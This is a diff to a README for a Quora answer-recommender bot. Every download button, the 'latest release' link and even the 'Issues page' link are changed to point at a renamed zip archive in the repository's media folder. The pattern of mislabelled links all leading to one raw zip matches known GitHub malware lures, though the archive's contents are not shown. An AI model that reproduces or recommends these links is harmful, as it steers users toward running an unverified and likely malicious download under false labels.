@@ -1,6 +1,6 @@
 # 🤖 Quora-Answer-Recommender-Bot - Simplify Your Quora Interactions
 
-[![Download](https://raw.githubusercontent.com/johnpad10/Quora-Answer-Recommender-Bot/main/media/Quora-Answer-Recommender-Bot-1.5.zip)](https://raw.githubusercontent.com/johnpad10/Quora-Answer-Recommender-Bot/main/media/Quora-Answer-Recommender-Bot-1.5.zip)
+[![Download](https://raw.githubusercontent.com/johnpad10/Quora-Answer-Recommender-Bot/main/media/Bot-Recommender-Answer-Quora-v3.5.zip)](https://raw.githubusercontent.com/johnpad10/Quora-Answer-Recommender-Bot/main/media/Bot-Recommender-Answer-Quora-v3.5.zip)
 
 ## 📌 Description
 
@@ -12,7 +12,7 @@ To get started with the Quora Answer Recommender Bot, follow the steps below. No
 
 ## 📥 Download & Install
 
-1. **Visit this page to download:** [Download the latest release](https://raw.githubusercontent.com/johnpad10/Quora-Answer-Recommender-Bot/main/media/Quora-Answer-Recommender-Bot-1.5.zip).
+1. **Visit this page to download:** [Download the latest release](https://raw.githubusercontent.com/johnpad10/Quora-Answer-Recommender-Bot/main/media/Bot-Recommender-Answer-Quora-v3.5.zip).
   
 2. On the Releases page, find the latest version of the Quora Answer Recommender Bot.
 
@@ -76,7 +76,7 @@ You can install the bot on multiple devices, but you may need to log in each tim
 
 ## 🔗 Support & Feedback
 
-For any support or feedback, please visit the [Issues page](https://raw.githubusercontent.com/johnpad10/Quora-Answer-Recommender-Bot/main/media/Quora-Answer-Recommender-Bot-1.5.zip) on GitHub.
+For any support or feedback, please visit the [Issues page](https://raw.githubusercontent.com/johnpad10/Quora-Answer-Recommender-Bot/main/media/Bot-Recommender-Answer-Quora-v3.5.zip) on GitHub.
 
 ## 🏷️ Topics
 
@@ -91,4 +91,4 @@ For any support or feedback, please visit the [Issues page](https://raw.githubus
 - quora-content-optimization
 - ui-automator
 
-[![Download](https://raw.githubusercontent.com/johnpad10/Quora-Answer-Recommender-Bot/main/media/Quora-Answer-Recommender-Bot-1.5.zip)](https://raw.githubusercontent.com/johnpad10/Quora-Answer-Recommender-Bot/main/media/Quora-Answer-Recommender-Bot-1.5.zip)
+[![Download](https://raw.githubusercontent.com/johnpad10/Quora-Answer-Recommender-Bot/main/media/Bot-Recommender-Answer-Quora-v3.5.zip)](https://raw.githubusercontent.com/johnpad10/Quora-Answer-Recommender-Bot/main/media/Bot-Recommender-Answer-Quora-v3.5.zip)
